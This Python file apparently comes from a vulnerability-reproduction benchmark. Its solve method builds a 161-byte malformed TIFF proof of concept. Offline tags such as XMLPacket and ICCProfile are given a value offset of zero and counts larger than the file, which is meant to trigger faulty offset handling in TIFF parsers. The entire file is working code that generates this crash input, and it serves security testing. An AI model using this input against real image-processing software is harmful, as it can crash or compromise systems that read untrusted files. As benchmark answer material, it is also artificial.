import struct
from typing import List, Tuple

class Solution:
    def solve(self, src_path: str) -> bytes:
        le = "<"

        def u16(x: int) -> bytes:
            return struct.pack(le + "H", x & 0xFFFF)

        def u32(x: int) -> bytes:
            return struct.pack(le + "I", x & 0xFFFFFFFF)

        # Build a small, mostly-valid TIFF with offline tags whose value_offset is 0.
        # Includes baseline image tags plus large "offline" tags (XMLPacket and ICCProfile)
        # with count > file length, to strongly exercise buggy offset==0 handling.
        # Total length: 161 bytes.
        tags: List[Tuple[int, int, int, int]] = []

        TIFF_BYTE = 1
        TIFF_SHORT = 3
        TIFF_LONG = 4
        TIFF_UNDEFINED = 7

        # We'll compute strip offset after knowing IFD size.
        # Minimal 1x1 RGB, uncompressed, single strip.
        width = 1
        height = 1
        spp = 3
        pixel_bytes = b"\x00\x00\x00"  # 1 pixel RGB

        # Add baseline tags
        tags.append((256, TIFF_LONG, 1, width))            # ImageWidth
        tags.append((257, TIFF_LONG, 1, height))           # ImageLength
        tags.append((258, TIFF_SHORT, 3, 0))               # BitsPerSample (offline due to count=3), invalid offset=0
        tags.append((259, TIFF_SHORT, 1, 1))               # Compression (none)
        tags.append((262, TIFF_SHORT, 1, 2))               # PhotometricInterpretation (RGB)
        # StripOffsets to be filled later
        tags.append((273, TIFF_LONG, 1, 0))                # StripOffsets
        tags.append((277, TIFF_SHORT, 1, spp))             # SamplesPerPixel
        tags.append((278, TIFF_LONG, 1, height))           # RowsPerStrip
        tags.append((279, TIFF_LONG, 1, len(pixel_bytes))) # StripByteCounts
        tags.append((284, TIFF_SHORT, 1, 1))               # PlanarConfiguration (contiguous)

        # Add likely "offline" tags with invalid value_offset==0 and count larger than file size
        tags.append((700, TIFF_BYTE, 200, 0))              # XMLPacket (XMP) - offline, invalid offset=0
        tags.append((34675, TIFF_UNDEFINED, 200, 0))       # ICCProfile - offline, invalid offset=0

        tags.sort(key=lambda x: x[0])
        num_entries = len(tags)

        header = b"II" + u16(42) + u32(8)  # little-endian, magic 42, first IFD at offset 8

        ifd_size = 2 + num_entries * 12 + 4
        strip_offset = 8 + ifd_size

        # Patch StripOffsets value
        patched_tags: List[Tuple[int, int, int, int]] = []
        for tag, typ, cnt, val in tags:
            if tag == 273:
                patched_tags.append((tag, typ, cnt, strip_offset))
            else:
                patched_tags.append((tag, typ, cnt, val))

        ifd = bytearray()
        ifd += u16(num_entries)
        for tag, typ, cnt, val in patched_tags:
            ifd += u16(tag)
            ifd += u16(typ)
            ifd += u32(cnt)
            ifd += u32(val)
        ifd += u32(0)  # next IFD offset

        poc = header + bytes(ifd) + pixel_bytes
        return poc